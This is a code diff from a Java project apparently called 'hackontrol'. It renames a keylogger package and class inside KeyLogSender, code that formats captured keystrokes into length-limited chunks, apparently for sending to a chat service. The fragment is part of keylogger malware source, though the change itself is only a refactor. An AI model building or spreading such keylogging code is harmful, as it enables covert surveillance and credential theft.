@@ -1,4 +1,4 @@
-package com.khopan.hackontrol.channel.keylogger;
+package com.khopan.hackontrol.module.keylogger;
 
 import java.awt.event.KeyEvent;
 import java.util.ArrayList;
@@ -40,15 +40,15 @@ public class KeyLogSender {
 			boolean first = true;
 			boolean previousSingleCharacter = true;
 			boolean previousSpace = true;
-			int limit = KeyLoggerChannel.RawKeyMode ? 2000 : 1992;
-			String prefix = KeyLoggerChannel.RawKeyMode ? "" : "```\n";
-			String suffix = KeyLoggerChannel.RawKeyMode ? "" : "\n```";
+			int limit = KeyLoggerModule.RawKeyMode ? 2000 : 1992;
+			String prefix = KeyLoggerModule.RawKeyMode ? "" : "```\n";
+			String suffix = KeyLoggerModule.RawKeyMode ? "" : "\n```";
 
 			for(int i = 0; i < size; i++) {
 				KeyEntry entry = NativeLibrary.KEYSTROKE_LIST.get(i);
 				String entryText;
 
-				if(KeyLoggerChannel.RawKeyMode) {
+				if(KeyLoggerModule.RawKeyMode) {
 					entryText = this.getKeyEntryText(entry);
 				} else {
 					if(!entry.keyDown) {
